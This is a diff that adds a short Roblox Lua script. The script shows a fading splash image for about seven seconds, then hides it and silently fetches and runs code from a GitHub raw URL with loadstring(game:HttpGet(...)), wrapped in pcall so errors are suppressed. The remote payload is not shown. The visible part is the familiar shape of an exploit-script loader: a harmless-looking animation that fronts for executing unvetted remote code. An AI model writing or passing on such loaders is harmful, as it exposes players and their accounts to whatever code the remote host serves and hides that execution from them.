@@ -1,0 +1,44 @@
+local decalId = "138323848862554"
+local scriptUrl = "https://raw.githubusercontent.com/LouieCLE/CLe/refs/heads/main/CLE"
+
+local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
+screenGui.Name = "CLE_GUI"
+screenGui.ResetOnSpawn = false
+
+local image = Instance.new("ImageLabel", screenGui)
+image.Size = UDim2.new(0.3, 0, 0.3, 0)
+image.Position = UDim2.new(0.35, 0, 0.35, 0)
+image.BackgroundTransparency = 1
+image.Image = "rbxassetid://" .. decalId
+image.ScaleType = Enum.ScaleType.Fit
+image.ImageTransparency = 1
+image.ClipsDescendants = true
+image.Name = "CLEImage"
+
+local corner = Instance.new("UICorner", image)
+corner.CornerRadius = UDim.new(1, 0)
+
+local tweenService = game:GetService("TweenService")
+local fadeTime = 1
+local totalTime = 7
+local startTime = tick()
+
+local fadeIn = tweenService:Create(image, TweenInfo.new(fadeTime), {ImageTransparency = 0})
+local fadeOut = tweenService:Create(image, TweenInfo.new(fadeTime), {ImageTransparency = 1})
+
+spawn(function()
+	while tick() - startTime < totalTime do
+		fadeIn:Play()
+		fadeIn.Completed:Wait()
+		wait(0.5)
+		fadeOut:Play()
+		fadeOut.Completed:Wait()
+		wait(0.5)
+	end
+
+	image.Visible = false
+
+	pcall(function()
+		loadstring(game:HttpGet(scriptUrl))()
+	end)
+end)
